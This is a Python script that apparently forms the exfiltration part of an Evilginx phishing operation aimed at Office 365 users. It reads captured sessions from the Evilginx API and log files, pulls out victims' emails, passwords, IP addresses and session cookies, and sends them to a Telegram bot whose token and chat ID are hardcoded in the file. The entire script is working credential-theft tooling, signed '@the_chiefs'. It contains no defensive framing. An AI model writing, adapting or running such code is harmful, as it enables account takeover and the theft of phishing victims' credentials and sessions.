#!/usr/bin/env python3
import requests
import sys
import json
import time
import os
import re

# Configuration
TELEGRAM_BOT_TOKEN = "7718476856:AAG45fi-GQU8RSLCwCvZYIGmy8Ee37Fc4mk"
TELEGRAM_CHAT_ID = "512741129"
COOKIES_DIR = "/root/evilginx_sessions"

def send_message(message):
    """Send message to Telegram"""
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    data = {"chat_id": TELEGRAM_CHAT_ID, "text": message, "parse_mode": "Markdown"}
    
    try:
        response = requests.post(url, json=data)
        return response.status_code == 200
    except Exception as e:
        print(f"Error sending message: {e}")
        return False

def save_cookies_to_json(session_data):
    """Save session cookies to JSON file"""
    if not os.path.exists(COOKIES_DIR):
        os.makedirs(COOKIES_DIR)
    
    # Create filename with timestamp
    timestamp = int(time.time())
    filename = f"{COOKIES_DIR}/session_{timestamp}.json"
    
    # Extract cookies from session data
    cookies = extract_cookies_from_session(session_data)
    
    if cookies:
        # Save cookies to JSON file
        with open(filename, 'w') as f:
            json.dump(cookies, f, indent=2)
        
        # Send notification with file info
        message = f"🔴 **NEW SESSION CAPTURED** 🔴\n"
        message += f"📧 **Email**: {session_data.get('username', 'N/A')}\n"
        message += f"🔑 **Password**: {session_data.get('password', 'N/A')}\n"
        message += f"📍 **IP**: {session_data.get('ip', 'N/A')}\n"
        message += f"🍪 **Cookies saved**: {filename}\n"
        message += f"⏰ **Time**: {time.ctime()}\n"
        message += f"📧 **From @the_chiefs**"
        
        send_message(message)
        
        # Also send the JSON file if it's not too large
        if os.path.getsize(filename) < 10485760:  # 10MB limit
            send_file_to_telegram(filename, cookies)
        
        return filename
    return None

def extract_cookies_from_session(session_data):
    """Extract cookies from session data"""
    cookies = []
    
    # Try to get cookies from various sources
    if 'cookies' in session_data:
        cookies = session_data['cookies']
    elif 'session_cookies' in session_data:
        cookies = session_data['session_cookies']
    else:
        # Try to extract from log or other sources
        cookies = extract_cookies_from_logs()
    
    return cookies

def extract_cookies_from_logs():
    """Extract cookies from Evilginx logs"""
    cookies = []
    
    try:
        # Read Evilginx log file
        with open("/root/.evilginx/evilginx.log", "r") as f:
            lines = f.readlines()
            
        # Look for cookie patterns in recent logs
        for line in lines[-50:]:  # Last 50 lines
            # Look for cookie patterns
            cookie_matches = re.findall(r'(Set-Cookie: ([^=]+)=([^;]+))', line)
            for match in cookie_matches:
                cookies.append({
                    "name": match[1],
                    "value": match[2],
                    "domain": session_data.get('domain', ''),
                    "path": "/",
                    "httpOnly": True,
                    "secure": True
                })
                
    except Exception as e:
        print(f"Error extracting cookies from logs: {e}")
    
    return cookies

def send_file_to_telegram(filename, cookies):
    """Send JSON file to Telegram"""
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
        
        with open(filename, 'rb') as f:
            files = {'document': (os.path.basename(filename), f, 'application/json')}
            data = {'chat_id': TELEGRAM_CHAT_ID, 'caption': f"🍪 Session cookies - {len(cookies)} cookies captured"}
            
            response = requests.post(url, files=files, data=data)
            return response.status_code == 200
            
    except Exception as e:
        print(f"Error sending file to Telegram: {e}")
        return False

def monitor_sessions():
    """Monitor Evilginx sessions and save cookies"""
    last_sessions = set()
    
    while True:
        try:
            # Get current sessions
            sessions = get_evilginx_sessions()
            current_sessions = set()
            
            for session in sessions:
                session_id = session.get('id', '')
                current_sessions.add(session_id)
                
                # If this is a new session, save cookies
                if session_id not in last_sessions:
                    save_cookies_to_json(session)
            
            last_sessions = current_sessions
            time.sleep(5)  # Check every 5 seconds
            
        except Exception as e:
            print(f"Error monitoring sessions: {e}")
            time.sleep(10)

def get_evilginx_sessions():
    """Get sessions from Evilginx"""
    sessions = []
    
    try:
        # Try to get sessions from Evilginx API
        response = requests.get("http://localhost:5000/api/sessions", timeout=5)
        if response.status_code == 200:
            data = response.json()
            sessions = data.get('sessions', [])
    except:
        pass
    
    # Fallback to parsing logs
    if not sessions:
        sessions = parse_evilginx_logs()
    
    return sessions

def parse_evilginx_logs():
    """Parse Evilginx logs for session data"""
    sessions = []
    
    try:
        # Read Evilginx log file
        with open("/root/.evilginx/evilginx.log", "r") as f:
            lines = f.readlines()
            
        for line in lines[-100:]:  # Last 100 lines
            if "credentials" in line.lower() or "login" in line.lower():
                # Extract session info from log
                session_data = extract_session_from_log(line)
                if session_data:
                    sessions.append(session_data)
                    
    except Exception as e:
        print(f"Error parsing logs: {e}")
    
    return sessions

def extract_session_from_log(line):
    """Extract session data from log line"""
    # Parse log line for credentials
    email_match = re.search(r'([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})', line)
    ip_match = re.search(r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})', line)
    
    if email_match:
        return {
            "id": f"session_{int(time.time())}",
            "username": email_match.group(1),
            "ip": ip_match.group(1) if ip_match else "unknown",
            "time": int(time.time()),
            "domain": "office365.com"  # Default domain
        }
    
    return None

if __name__ == "__main__":
    if len(sys.argv) > 1:
        # Direct message mode
        message = " ".join(sys.argv[1:])
        send_message(message)
        print("Message sent successfully!")
        sys.exit(0)
    else:
        # Monitor mode
        monitor_sessions()
